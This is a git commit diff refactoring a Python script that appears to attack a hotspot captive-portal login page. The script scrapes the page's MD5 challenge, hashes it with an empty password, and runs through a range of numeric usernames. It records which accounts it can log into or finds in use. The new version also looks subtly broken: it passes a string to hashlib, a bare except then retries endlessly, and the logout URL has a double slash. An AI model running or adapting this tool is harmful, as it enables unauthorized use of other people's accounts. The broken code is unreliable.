19c11e52b3bbb027f623b3321a73c3da043ead61
melbadry9 <>
2025-10-15 18:06:56 +0300

    Small refactor code

--- mk.py
+++ mk.py
@@ -1,68 +1,66 @@
-import os
 import time
-
-import js2py
+import hashlib
 import requests
 
 
-def first_html():
-	url = "http://10.0.0.2/login"
-	html_attempt = requests.get(url)
-	html = html_attempt.text
-	return html
+URL_IP = "http://10.0.0.2"  # No / at the end
 
-def scrap(html):
-	start = html.find("5('") 
-	end = html.find("');",start)
-	p_data = html[start+3:end]
-	f_data = p_data.replace("' + document.login.password.value + '","")
-	return f_data
+
+def first_html():
+    url = f"{URL_IP}/login"
+    return requests.get(url).text
+
+
+def scrap(html, data=""):
+    start = html.find("5('")
+    end = html.find("');", start)
+    p_data = html[start + 3 : end]
+    return p_data.replace("' + document.login.password.value + '", data)
+
 
 def password_gen(data):
-	path = os.path.join(os.path.dirname(__file__),"md5.js")
-	md5_file = open(path,"r",encoding="utf-8")
-	js = str(md5_file.read())
-	js_data = js.replace('HeRe',data)
-	password = js2py.eval_js(js_data)
-	md5_file.close()
-	return password
+    hash_md5 = hashlib.md5()
+    hash_md5.update(data)
+    return hash_md5.hexdigest()
 
-def login(user,password):
-	t1 = time.time()
-	url = "http://10.0.0.2:80/login"
-	L_data = {"username": user , "password": password}
-	login_attempt = requests.post(url, data = L_data,timeout=10 )
-	response = login_attempt.headers['Content-Length']
-	check = int(response) - len(str(user))
-	page = login_attempt.text
 
-	if check < 1600:
-		stat = " loged \a"
-		requests.get("http://10.0.0.2/logout")
-		loged_u.append(user)
-		page = first_html()
-	elif check < 3500:
-		stat = " Used" 
-		used_u.append(user)
-	else:
-		stat = "     "
-	t2 = time.time()
-	total = t2 -t1 
-	print("" + str(user) + ": " + stat + " \t\t\tTime: " , total)
-	return password_gen(scrap(page))
+def login(user, password):
+    t1 = time.time()
+    url = f"{URL_IP}/login"
+    L_data = {"username": user, "password": password}
+    login_attempt = requests.post(url, data=L_data, timeout=10)
+    response = login_attempt.headers["Content-Length"]
+    check = int(response) - len(str(user))
+    page = login_attempt.text
 
-if __name__ == '__main__':
-	first_user = int(input('First User: '))
-	last_user = int(input('Last User: '))
-	used_u, loged_u= [], []
-	pas = password_gen(scrap(first_html()))
-	for user in range(first_user,last_user+1):
-		done = False
-		while not done:
-			try:
-				pas = login(user,pas)
-				done = True
-			except:
-				pass 
-	print("USED:   ", used_u)
-	print("LOGGED: ", loged_u)
+    if check < 1600:
+        stat = " logged \a"
+        requests.get(f"{URL_IP}//logout")
+        loged_u.append(user)
+        page = first_html()
+    elif check < 3500:
+        stat = " Used"
+        used_u.append(user)
+    else:
+        stat = "     "
+    t2 = time.time()
+    total = t2 - t1
+    print(str(user) + ": " + stat + " \t\t\tTime: ", total)
+    return password_gen(scrap(page))
+
+
+if __name__ == "__main__":
+    first_user = int(input("First User: "))
+    last_user = int(input("Last User: "))
+    used_u, loged_u = [], []
+    pas = password_gen(scrap(first_html()))
+    for user in range(first_user, last_user + 1):
+        done = False
+        while not done:
+            try:
+                pas = login(user, pas)
+                done = True
+            except:
+                pass
+    print("USED:   ", used_u)
+    print("LOGGED: ", loged_u)
